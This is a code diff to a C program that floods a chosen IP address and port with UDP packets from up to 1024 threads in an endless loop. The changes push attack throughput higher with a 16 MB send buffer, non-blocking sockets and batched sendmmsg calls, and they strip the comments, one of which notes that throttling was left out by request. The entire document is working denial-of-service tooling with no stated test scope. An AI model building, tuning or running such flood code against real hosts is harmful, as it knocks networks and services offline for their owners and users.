@@ -8,6 +8,8 @@
 #include <time.h>
 #include <fcntl.h>
 
+#define SO_SNDBUF_SIZE (1024 * 1024 * 16)
+#define NON_BLOCKING 1
 #define MAX_THREADS 1024
 #define MAX_PAYLOAD 65535
 
@@ -19,7 +21,7 @@ struct thread_args {
     int port;
     int packet_size;
     char payload_mode[16];
-    char* payload; // thêm pointer payload dùng chung
+    char* payload;
 };
 
 void* pps_monitor(void* arg) {
@@ -52,7 +54,6 @@ void generate_payload(char* buf, int size, const char* mode) {
             buf[i] = (char)(rand() % 256);
         }
     } else {
-        // fallback random nếu mode không hợp lệ
         for (int i = 0; i < size; i++) {
             buf[i] = (char)(rand() % 256);
         }
@@ -61,21 +62,46 @@ void generate_payload(char* buf, int size, const char* mode) {
 
 void* udp_flood(void* arguments) {
     struct thread_args* args = (struct thread_args*)arguments;
-    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
+    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (sockfd < 0) return NULL;
 
+    int sndbuf = SO_SNDBUF_SIZE;
+    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+
+    #if NON_BLOCKING
+    fcntl(sockfd, F_SETFL, O_NONBLOCK);
+    #endif
+
     struct sockaddr_in target;
+    memset(&target, 0, sizeof(target));
     target.sin_family = AF_INET;
     target.sin_port = htons(args->port);
     inet_pton(AF_INET, args->ip, &target.sin_addr);
 
-    // Sử dụng payload đã tạo sẵn
-    char* payload = args->payload;
+    #ifdef USE_SENDMMSG
+    struct mmsghdr msgs[32];
+    struct iovec iovs[32];
+    for (int i = 0; i < 32; i++) {
+        iovs[i].iov_base = args->payload;
+        iovs[i].iov_len = args->packet_size;
+        msgs[i].msg_hdr.msg_iov = &iovs[i];
+        msgs[i].msg_hdr.msg_iovlen = 1;
+        msgs[i].msg_hdr.msg_name = &target;
+        msgs[i].msg_hdr.msg_namelen = sizeof(target);
+    }
+    #endif
 
     while (1) {
-        sendto(sockfd, payload, args->packet_size, 0, (struct sockaddr*)&target, sizeof(target));
+        #ifdef USE_SENDMMSG
+        int sent = sendmmsg(sockfd, msgs, 32, 0);
+        __sync_fetch_and_add(&pps_counter, sent);
+        __sync_fetch_and_add(&mbps_counter, sent * args->packet_size);
+        #else
+        sendto(sockfd, args->payload, args->packet_size, 0, 
+              (struct sockaddr*)&target, sizeof(target));
         __sync_fetch_and_add(&pps_counter, 1);
         __sync_fetch_and_add(&mbps_counter, args->packet_size);
+        #endif
     }
 
     close(sockfd);
@@ -105,7 +131,6 @@ int main(int argc, char* argv[]) {
 
     srand(time(NULL));
 
-    // Tạo payload duy nhất
     char* shared_payload = malloc(packet_size);
     if (!shared_payload) {
         perror("malloc payload");
@@ -131,10 +156,9 @@ int main(int argc, char* argv[]) {
         args->packet_size = packet_size;
         strncpy(args->payload_mode, payload_mode, sizeof(args->payload_mode) - 1);
         args->payload_mode[sizeof(args->payload_mode) - 1] = '\0';
-        args->payload = shared_payload; // dùng chung payload đã tạo
+        args->payload = shared_payload;
 
         pthread_create(&thread_ids[i], NULL, udp_flood, args);
-        // Không dùng usleep(1000) theo yêu cầu
     }
 
     for (int i = 0; i < threads; i++) {
